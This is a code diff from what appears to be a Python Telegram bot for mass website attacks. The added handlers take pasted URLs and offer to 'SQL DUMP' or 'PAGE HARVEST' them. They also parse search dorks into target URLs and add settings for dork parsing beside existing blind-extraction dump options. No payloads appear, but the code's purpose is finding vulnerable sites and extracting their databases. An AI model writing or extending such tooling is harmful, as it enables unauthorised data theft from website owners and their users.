+                [InlineKeyboardButton("📥 SQL DUMP these", callback_data="df:paste")],
+                [InlineKeyboardButton("🕸 PAGE HARVEST these", callback_data="df:hpaste")]]
+        context.user_data["paste_urls"] = urls[:2000]
+        await update.message.reply_text(
+            (H("URLs DETECTED", "%s found" % fmt(len(urls))) + "\n\n"
+             + P("What do you want to do with them?") + "\n\n"
+             + "\n".join("<code>%s</code>" % esc(u[:90]) for u in urls[:4])
+             + ("\n<i>+ %d more…</i>" % (len(urls) - 4) if len(urls) > 4 else "")),
+            parse_mode=ParseMode.HTML, reply_markup=RK(rows))
+        return
+    if dorkish:
+        context.user_data["paste_dorks"] = [l.strip() for l in text.splitlines() if l.strip()][:2000]
+        await update.message.reply_text(
+            (H("DORKS DETECTED", "%s lines" % fmt(dorkish)) + "\n\n"
+             + P("Run the parser on these?")),
+            parse_mode=ParseMode.HTML,
+            reply_markup=RK([[InlineKeyboardButton("🚀 PARSE THESE DORKS",
+                                                  callback_data="pr:paste")],
+                             [InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
+        return
+    await update.message.reply_text(
+        "🤔 <b>That didn't match any step.</b>\n\n"
+        "You can send me:\n"
+        "• <b>URLs</b> — scan or dump them\n"
+        "• <b>Dorks</b> — parse them into URLs\n"
+        "• <b>Keywords / seeds</b> — build HQ keywords\n"
+        "• <b>a file</b> (.txt .csv .json .xlsx)\n\n"
+        "Or pick a tool:",
+        parse_mode=ParseMode.HTML, reply_markup=kb_main())
 
 TOOL_HANDLERS = {
     "dork": tool_dork,
@@ -11160,6 +11396,7 @@ async def _post_init(app) -> None:
 
 
 def build_app() -> Application:
+    _patch_telegram_safe()
     app = (ApplicationBuilder().token(TOKEN).concurrent_updates(True)
            .post_init(_post_init).build())
     # group -1: har /command = naya intent → purana adhoora input prompt band
@@ -11379,6 +11616,9 @@ BATCH_KEYS = {
     "dumpblind": ("dump_blind", 0, 1, "Dump: blind extraction (0/1)", 1, "🙈"),
     "dumpblindrows": ("dump_blind_rows", 0, 50, "Dump: blind rows per table", 0, "🐢"),
     "dumpreq": ("dump_requests", 100, 5000, "Dump: request cap per URL", 500, "🔋"),
+    "pages": ("parse_pages", 1, 10, "Parser pages per dork", 1, "📄"),
+    "threads": ("parse_threads", 1, 10, "Parser parallel engines", 4, "🧵"),
+    "ptimeout": ("parse_timeout", 4, 40, "Parser engine timeout (s)", 8, "⏱"),
 }
 
 
